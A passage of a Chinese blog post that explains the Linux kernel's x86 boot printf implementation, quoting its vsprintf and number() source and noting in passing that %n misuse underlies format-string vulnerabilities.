~</code>运算来清除相应标志位,这个在嵌入式开发里面很常见,一般是操作外设寄存器用的.在这里的逻辑是清除<code>补零</code>标志.这里也有一个健壮性的判断,不过number函数仅限于本文件调用,一般的开发者应该不会传入错误的base.字符<code>c</code>也是用来填充的,为<code>0</code>或者空格.接下来就是检测SIGH标志,并根据正负和0填充的需求占据<code>size</code>和置位<code>sign</code>.之后判断16进制和8进制情况,16进制的<code>size</code>减2是由于要填充<code>0x</code>或者<code>0X</code>,8进制只需要填充<code>0</code>即可.之后就开始进制转换成字符了,并根据<code>locase</code>的实际情况对于16进制翻转大小写字符.而对于数字0~9,由于他们的ascll码的第4位已经置位,所以或上1并不影响自身的值,而默认的大写字母第4位没有置位,如果程序员需要转换就可以转换.这个是很巧妙的!!!值得学习的技巧.传进来的<code>precision</code>表示精度,由于这里没有浮点匹配,这里就主要用来截取串的长度.如果<code>ZEROPAD</code>和<code>LEFT</code>都没有置位,就填充空格.然后根据进制继续填充数值.如果不是左对齐,就根据<code>size</code>的剩余大小继续填充<code>c</code>,后面就根据i的情况填充了,直到满足<code>size</code>这个宽度域为0.最后返回<code>str</code>的首地址.<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">char</span> *<span class=\"title\">number</span><span class=\"params\">(<span class=\"keyword\">char</span> *str, <span class=\"keyword\">long</span> num, <span class=\"keyword\">int</span> base, <span class=\"keyword\">int</span> size, <span class=\"keyword\">int</span> precision,</span></span></div><div class=\"line\">\t\t    <span class=\"keyword\">int</span> type)</div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"comment\">/* we are called with base 8, 10 or 16, only, thus don't need \"G...\"  */</span></div><div class=\"line\">\t<span class=\"keyword\">static</span> <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> digits[<span class=\"number\">16</span>] = <span class=\"string\">\"0123456789ABCDEF\"</span>; <span class=\"comment\">/* \"GHIJKLMNOPQRSTUVWXYZ\"; */</span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">char</span> tmp[<span class=\"number\">66</span>];</div><div class=\"line\">\t<span class=\"keyword\">char</span> c, sign, locase;</div><div class=\"line\">\t<span class=\"keyword\">int</span> i;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* locase = 0 or 0x20. ORing digits or letters with 'locase'</span></div><div class=\"line\">\t * produces same digits or (maybe lowercased) letters */</div><div class=\"line\">\tlocase = (type &amp; SMALL);</div><div class=\"line\">\t<span class=\"keyword\">if</span> (type &amp; LEFT)</div><div class=\"line\">\t\ttype &amp;= ~ZEROPAD;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (base &lt; <span class=\"number\">2</span> || base &gt; <span class=\"number\">16</span>)</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</div><div class=\"line\">\tc = (type &amp; ZEROPAD) ? <span class=\"string\">'0'</span> : <span class=\"string\">' '</span>;</div><div class=\"line\">\tsign = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (type &amp; SIGN) &#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (num &lt; <span class=\"number\">0</span>) &#123;</div><div class=\"line\">\t\t\tsign = <span class=\"string\">'-'</span>;</div><div class=\"line\">\t\t\tnum = -num;</div><div class=\"line\">\t\t\tsize--;</div><div class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (type &amp; PLUS) &#123;</div><div class=\"line\">\t\t\tsign = <span class=\"string\">'+'</span>;</div><div class=\"line\">\t\t\tsize--;</div><div class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (type &amp; SPACE) &#123;</div><div class=\"line\">\t\t\tsign = <span class=\"string\">' '</span>;</div><div class=\"line\">\t\t\tsize--;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (type &amp; SPECIAL) &#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (base == <span class=\"number\">16</span>)</div><div class=\"line\">\t\t\tsize -= <span class=\"number\">2</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (base == <span class=\"number\">8</span>)</div><div class=\"line\">\t\t\tsize--;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\ti = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (num == <span class=\"number\">0</span>)</div><div class=\"line\">\t\ttmp[i++] = <span class=\"string\">'0'</span>;</div><div class=\"line\">\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t<span class=\"keyword\">while</span> (num != <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\ttmp[i++] = (digits[__do_div(num, base)] | locase);</div><div class=\"line\">\t<span class=\"keyword\">if</span> (i &gt; precision)</div><div class=\"line\">\t\tprecision = i;</div><div class=\"line\">\tsize -= precision;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (!(type &amp; (ZEROPAD + LEFT)))</div><div class=\"line\">\t\t<span class=\"keyword\">while</span> (size-- &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t*str++ = <span class=\"string\">' '</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (sign)</div><div class=\"line\">\t\t*str++ = sign;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (type &amp; SPECIAL) &#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (base == <span class=\"number\">8</span>)</div><div class=\"line\">\t\t\t*str++ = <span class=\"string\">'0'</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (base == <span class=\"number\">16</span>) &#123;</div><div class=\"line\">\t\t\t*str++ = <span class=\"string\">'0'</span>;</div><div class=\"line\">\t\t\t*str++ = (<span class=\"string\">'X'</span> | locase);</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (!(type &amp; LEFT))</div><div class=\"line\">\t\t<span class=\"keyword\">while</span> (size-- &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t*str++ = c;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (i &lt; precision--)</div><div class=\"line\">\t\t*str++ = <span class=\"string\">'0'</span>;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (i-- &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t*str++ = tmp[i];</div><div class=\"line\">\t<span class=\"keyword\">while</span> (size-- &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t*str++ = <span class=\"string\">' '</span>;</div><div class=\"line\">\t<span class=\"keyword\">return</span> str;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h2 id=\"puts\"><a href=\"#puts\" class=\"headerlink\" title=\"puts\"></a>puts</h2><p>至于puts的实现应该就不难了,内核中有很多处代码.应该就是简单地逐字节地拷贝到某缓冲区,再由内核的IO调度机制向屏幕或者串口等字符驱动设备文件拷贝输出.一般在嵌入式开发里面串口输出的比较常见.而普通PC的CPU(类似以前8086时代的intel)可能是按照主板等的设计给显存预留出地址空间,只要CPU把数据送往那个地址空间(貌似是0x0B800)显示设备就能够打印出相应的字符.</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>最起初的printf实现大概就这么多吧,可能内核开发者考虑到某些CPU没有浮点体系就没有把处理浮点类型的情况加进去的,标准的printf实现还是需要参考glibc库的.后期有空继续分析.对了,前面有说到<code>格式化字符串漏洞</code>参考看雪论坛这篇<a href=\"http://bbs.pediy.com/showthread.php?t=213153\" target=\"_blank\" rel=\"external\">文章</a>,如果没注册看不了的话先<a href=\"http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458279936&amp;idx=1&amp;sn=2eb47265a0d170c45403d4b5d9097549&amp;chksm=b181508a86f6d99c27d4b2c9281a573ac16284c3a7f7f6f3d9cad3a7452f3bcc22ba15616303&amp;scene=0#wechat_redirect\" target=\"_blank\" rel=\"external\">戳这里吧</a></p>\n","excerpt":"","more":"<blockquote>\n<p>printf实现还隐藏了很多参数,例如%n,printf返回值是啥你知道吗?格式化字符串漏洞成因何在?这里分析Linux内核中的printf实现,而非glibc库中的标准实现(我们用的肯定是标准库咯,不过很复杂~_~),因为这里没有%f等浮点类型的匹配,简单一些.</p>\n</blockquote>\n<p>参考资料:<br><a href=\"https://github.com/torvalds/linux/blob/master/arch/x86/boot/printf.c\">Linus的github仓库https://github.com/torvalds/linux/blob/master/arch/x86/boot/printf.c</a></p>\n<h2 id=\"printf大体\"><a href=\"#printf大体\" class=\"headerlink\" title=\"printf大体\"></a>printf大体</h2><p>首先我们找到printf函数的实现(由于x86体系容易理解便选择了这个体系),可以看到申请了1024个字节的空间来保存要格式化串,有人会问要是我给出的参数超过了1024不就缓冲区溢出程序会crash掉吗?我觉得编译器肯定会察觉到的,有兴趣的自己鼓捣下…大体就是将传递进来的参数根据压栈的顺序逐个取出并格式化成字符串,这个是在vsprintf函数实现的,返回值是两个地址的差,即本次输出的字符串数目.最后调用puts函数向终端输出.最后后才返回本次输出字符串数目.<br><img src=\"/images/printf.png\" alt=\"printf\"></p>\n<h2 id=\"va-系类宏\"><a href=\"#va-系类宏\" class=\"headerlink\" title=\"va_系类宏\"></a>va_系类宏</h2><p>然后我们利用sublime的插件来jump到<code>va_list</code>的定义,发现是一个char*的typedef.干脆就一起来认识一下<code>va_</code>系列的宏.</p>\n<p><code>acpi_native_int</code>也是一个typedef,根据最开始的配置决定是s32还是s64,在x86这里肯定就是有符号的32位了,即int类型的.<code>_AUPBND</code>和<code>_ADNBND</code>两个宏的值一样.而<code>_bnd</code>这个宏在32b体系下给出的是类型X的大小的4字节对齐值.在printf里面用的时候关系不是很大,因为格式化的时候不会是很大结构体(%结构体根本没实现啊),纵然是小于4字节的char,short之类的,存的时候可能是那么多字节,但是压栈的时候编译器会毫不犹豫地安排用一个寄存器扩展并压入栈顶的指令,所以不用担心,可以认为这个宏在printf里面仅仅是4字节对齐没问题的.<code>va_start(ap, A)</code>这个宏接到A(fmt)地址,再+4赋值给ap,原因在于A(fmt)是printf的第一个参数(格式化字符串含有%的部分),+4之后才能对准第一个真正要格式化的参数.而<code>va_arg(ap, T)</code>目的是先使得ap移往后一个参数但是返回的值确实本次参数的值,比较巧妙.<code>va_end(ap)</code>仅仅为了保证安全而象征性地将ap指向NULL.<br><img src=\"/images/va_arg.png\" alt=\"va_arg\"></p>\n<h2 id=\"vsprintf\"><a href=\"#vsprintf\" class=\"headerlink\" title=\"vsprintf\"></a>vsprintf</h2><p>vsprintf这个函数有几个重要的局部变量需要注意,英文注释写的很清楚了,flags标志主要是关于数字对齐这一块,等到number函数被调用的时候会判断的.field_width字段主要是占用宽度计算.precision是精度计算,其实是输出个字符个数控制.qualifier是对于长整型的扩展,例如将int转为long.(x86下int=long)<br><img src=\"/images/vsprintf.png\" alt=\"vsprintf\"><br>在定义了局部变量之后,一个for循环遍历fmt所有的字符,取出特别的%来格式化,最后计算地址偏移便完结了.当找到第一个%的时候,首先处理flags字段,定义个标号repeat来快速跳出,虽然听说C标准不推荐使用goto语句,但是能够提高效率为什么不能用呢?代码片段如下:<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> ZEROPAD\t1\t\t<span class=\"comment\">/* pad with zero */</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> SIGN\t2\t\t<span class=\"comment\">/* unsigned/signed long */</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> PLUS\t4\t\t<span class=\"comment\">/* show plus */</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> SPACE\t8\t\t<span class=\"comment\">/* space if plus */</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> LEFT\t16\t\t<span class=\"comment\">/* left justified */</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> SMALL\t32\t\t<span class=\"comment\">/* Must be 32 == 0x20 */</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> SPECIAL\t64\t\t<span class=\"comment\">/* 0x */</span></span></div><div class=\"line\"><span class=\"comment\">/* process flags */</span></div><div class=\"line\">\t\tflags = <span class=\"number\">0</span>;</div><div class=\"line\">\t      repeat:</div><div class=\"line\">\t\t++fmt;\t\t<span class=\"comment\">/* this also skips first '%' */</span></div><div class=\"line\">\t\t<span class=\"keyword\">switch</span> (*fmt) &#123;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'-'</span>:</div><div class=\"line\">\t\t\tflags |= LEFT;</div><div class=\"line\">\t\t\t<span class=\"keyword\">goto</span> repeat;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'+'</span>:</div><div class=\"line\">\t\t\tflags |= PLUS;</div><div class=\"line\">\t\t\t<span class=\"keyword\">goto</span> repeat;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">' '</span>:</div><div class=\"line\">\t\t\tflags |= SPACE;</div><div class=\"line\">\t\t\t<span class=\"keyword\">goto</span> repeat;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'#'</span>:</div><div class=\"line\">\t\t\tflags |= SPECIAL;</div><div class=\"line\">\t\t\t<span class=\"keyword\">goto</span> repeat;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'0'</span>:</div><div class=\"line\">\t\t\tflags |= ZEROPAD;</div><div class=\"line\">\t\t\t<span class=\"keyword\">goto</span> repeat;</div><div class=\"line\">\t\t&#125;</div></pre></td></tr></table></figure></p>\n<p>某些字段就不说了,用过printf的应该都知道的,其中的<code>#</code>作用就是方便16进制和8进制的格式化,例如<code>%#x</code>就会被默认加上<code>0x</code>,而<code>%#o</code>就会被默认加上<code>0</code>,具体可以看后面number函数实现就知道了.  </p>\n<hr>\n<blockquote>\n<p>找工作太忙了,今天才得有空继续分析^~^(2016.10.17) </p>\n</blockquote>\n<hr>\n<p>接下来就会去获得宽度字段,利用<code>isdigital</code>函数一步实现字符串转整型并使得fmt指针指向后续格式符.如果用<code>*</code>代替,将直接将压入的参数转为整型赋值为宽度字段.并根据正负号置标志位采取相应的对齐方式(默认为右对齐).  </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/* get field width */</span></div><div class=\"line\">\t\tfield_width = <span class=\"number\">-1</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (<span class=\"built_in\">isdigit</span>(*fmt))</div><div class=\"line\">\t\t\tfield_width = skip_atoi(&amp;fmt);</div><div class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (*fmt == <span class=\"string\">'*'</span>) &#123;</div><div class=\"line\">\t\t\t++fmt;</div><div class=\"line\">\t\t\t<span class=\"comment\">/* it's the next argument */</span></div><div class=\"line\">\t\t\tfield_width = va_arg(args, <span class=\"keyword\">int</span>);</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (field_width &lt; <span class=\"number\">0</span>) &#123;</div><div class=\"line\">\t\t\t\tfield_width = -field_width;</div><div class=\"line\">\t\t\t\tflags |= LEFT;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div></pre></td></tr></table></figure>\n<p>再下来就是获取精度了,一般有浮点类型的就得保留多少位的精度.首先得在串中检测到有<code>.</code>字符,之后的处理跟宽度就差不多了.先保存相关的参数然后会传到另外的函数做具体处理的.对于有<code>l</code>,<code>L</code>,<code>h</code>跟在后面的将使得<code>qualifier</code>被置为其ascll码值.<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/* get the precision */</span></div><div class=\"line\">\t\tprecision = <span class=\"number\">-1</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (*fmt == <span class=\"string\">'.'</span>) &#123;</div><div class=\"line\">\t\t\t++fmt;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (<span class=\"built_in\">isdigit</span>(*fmt))</div><div class=\"line\">\t\t\t\tprecision = skip_atoi(&amp;fmt);</div><div class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (*fmt == <span class=\"string\">'*'</span>) &#123;</div><div class=\"line\">\t\t\t\t++fmt;</div><div class=\"line\">\t\t\t\t<span class=\"comment\">/* it's the next argument */</span></div><div class=\"line\">\t\t\t\tprecision = va_arg(args, <span class=\"keyword\">int</span>);</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (precision &lt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t\tprecision = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"comment\">/* get the conversion qualifier */</span></div><div class=\"line\">\t\tqualifier = <span class=\"number\">-1</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (*fmt == <span class=\"string\">'h'</span> || *fmt == <span class=\"string\">'l'</span> || *fmt == <span class=\"string\">'L'</span>) &#123;</div><div class=\"line\">\t\t\tqualifier = *fmt;</div><div class=\"line\">\t\t\t++fmt;</div><div class=\"line\">\t\t&#125;</div></pre></td></tr></table></figure></p>\n<p>之后就进入最后的格式化匹配了,根据提供的格式化类型对压入的参数进行相应操作.首先会使得base默认为10进制,如果类似%c的话,直接根据左右对齐方式填充空白符,中间以<code>int</code>类型为地址单元取得参数的值直接强制转化为<code>unsigned char</code>类型的字符.为什么呢?详情参考我的另外一篇<a href=\"http://www.rutk1t0r.cn/2016/08/21/memory-align/\">文章</a>,我们需要知道这个是编译器自己这么压进去的就得这么去接收就行了.对于类似%s,首先取得参数首地址,然后调用安全的<code>strnlen</code>函数获取填充空白的长度.之后逐字符地拷贝,若非右对齐后续还需继续填充空白,<code>if</code>和<code>while</code>没有加<code>{}</code>可能看得不太清楚.建议源代码中的风格严谨一点好.对于%p如果没有字段宽度值则默认为2个指针大小的宽度,并使得flags的ZEROPAD置位.而后直接送往number函数继续处理.%n可是一个很生疏的东西,我猜测这个参数最初的目的是用于调试用的,可以检查本次printf调用在%n之前输出的字符个数,并将这个值赋给调用者传递进来的参数地址处,但是如果使用不当,就可能会造成<code>任意地址读写任意数据</code>的格式化字符串漏洞.<br>之后的几个参数大都是置位相应标志位而已,后期直接送往number函数处理,需要注意的是之前这几个参数后面完成后用的是<code>continue</code>,意思是直接跳转到最外面的<code>for</code>循环进行下一个字符的匹配,而%xXdiu后面接的是<code>break</code>,表示退出<code>switch</code>,转而进行后面的<code>h,L,l</code>的长类型的处理去了.还要注意在<code>switch case break</code>的结构中,如果<code>case</code>了第一个条件,之后如果没有遇到<code>break</code>,程序的控制流程将忽略后面的<code>case</code>条件,直接执行语句部分,直到遇见结束的<code>break</code>.因为这里已经出现了这种用法(匹配x的时候),所以应该注意一下,某些笔试题也会考察这个知识点.<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/* default base */</span></div><div class=\"line\">\t\tbase = <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">switch</span> (*fmt) &#123;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'c'</span>:</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!(flags &amp; LEFT))</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">while</span> (--field_width &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t\t\t*str++ = <span class=\"string\">' '</span>;</div><div class=\"line\">\t\t\t*str++ = (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span>)va_arg(args, <span class=\"keyword\">int</span>);</div><div class=\"line\">\t\t\t<span class=\"keyword\">while</span> (--field_width &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t\t*str++ = <span class=\"string\">' '</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'s'</span>:</div><div class=\"line\">\t\t\ts = va_arg(args, <span class=\"keyword\">char</span> *);</div><div class=\"line\">\t\t\tlen = strnlen(s, precision);</div><div class=\"line\"></div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!(flags &amp; LEFT))</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">while</span> (len &lt; field_width--)</div><div class=\"line\">\t\t\t\t\t*str++ = <span class=\"string\">' '</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; len; ++i)</div><div class=\"line\">\t\t\t\t*str++ = *s++;</div><div class=\"line\">\t\t\t<span class=\"keyword\">while</span> (len &lt; field_width--)</div><div class=\"line\">\t\t\t\t*str++ = <span class=\"string\">' '</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'p'</span>:</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (field_width == <span class=\"number\">-1</span>) &#123;</div><div class=\"line\">\t\t\t\tfield_width = <span class=\"number\">2</span> * <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">void</span> *);</div><div class=\"line\">\t\t\t\tflags |= ZEROPAD;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\tstr = number(str,</div><div class=\"line\">\t\t\t\t     (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>)va_arg(args, <span class=\"keyword\">void</span> *), <span class=\"number\">16</span>,</div><div class=\"line\">\t\t\t\t     field_width, precision, flags);</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'n'</span>:</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (qualifier == <span class=\"string\">'l'</span>) &#123;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">long</span> *ip = va_arg(args, <span class=\"keyword\">long</span> *);</div><div class=\"line\">\t\t\t\t*ip = (str - buf);</div><div class=\"line\">\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">int</span> *ip = va_arg(args, <span class=\"keyword\">int</span> *);</div><div class=\"line\">\t\t\t\t*ip = (str - buf);</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'%'</span>:</div><div class=\"line\">\t\t\t*str++ = <span class=\"string\">'%'</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t\t<span class=\"comment\">/* integer number formats - set up the flags and \"break\" */</span></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'o'</span>:</div><div class=\"line\">\t\t\tbase = <span class=\"number\">8</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'x'</span>:</div><div class=\"line\">\t\t\tflags |= SMALL;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'X'</span>:</div><div class=\"line\">\t\t\tbase = <span class=\"number\">16</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'d'</span>:</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'i'</span>:</div><div class=\"line\">\t\t\tflags |= SIGN;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'u'</span>:</div><div 